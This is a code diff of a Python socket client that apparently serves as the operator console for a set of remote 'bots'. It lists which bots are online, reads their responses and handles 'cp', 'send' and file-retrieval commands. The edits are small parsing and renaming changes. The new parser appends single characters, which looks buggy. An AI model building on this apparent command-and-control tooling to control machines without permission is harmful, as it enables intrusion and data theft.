@@ -15,14 +15,22 @@ online_bots = []
 
 
 def get_online_bots(respond):
+    respond = respond[respond.find('rt') + 2:]
     while respond != '':
-        respond = respond[respond.find('\n') + 1:]
-        online_bots.append(respond[:respond.find('\t')])
+        try:
+            online_bots.append(respond[respond.find('\n') + 1])
+            respond = respond[respond.find('\n') + 2:]
+        except:
+            respond = ''
+            break
+
+        # respond = respond[respond.find('\n') + 1:]
+        # online_bots.append(respond[:respond.find('\t')])
 
 
-def get_respond(client) -> str:
+def get_response(client) -> str:
     length = client.recv(5000).decode('utf-8')
-    print("Length: " + length)
+    # print("Length: " + length)
     respond = ''
     val = ''
     i = 0
@@ -35,16 +43,10 @@ def get_respond(client) -> str:
 
 
 def listen_for_respond(client, n_bots):
-    # i = 0
-    #  while i != int(n_bots):
-        # respond = client.recv(default_buff_l).decode('utf-8')
-        # print(respond)
-    respond = get_respond(client)
+    respond = get_response(client)
     print(respond)
     if 'online Bots' in respond:
         get_online_bots(respond)
-
-    # i += 1
 
 
 def get_file(client, file_name):
@@ -231,7 +233,6 @@ def main():
                             if 'cp' == cmd[:2] or 'send' in cmd:
                                 if len(cmd) > 3 and 'cp' in cmd:
                                     path_fn = get_path_filename(cmd)
-                                    # continue
                                     pass
                                 elif 'send' in cmd and len(cmd) > 5:
                                     filename_send = get_filename(cmd)
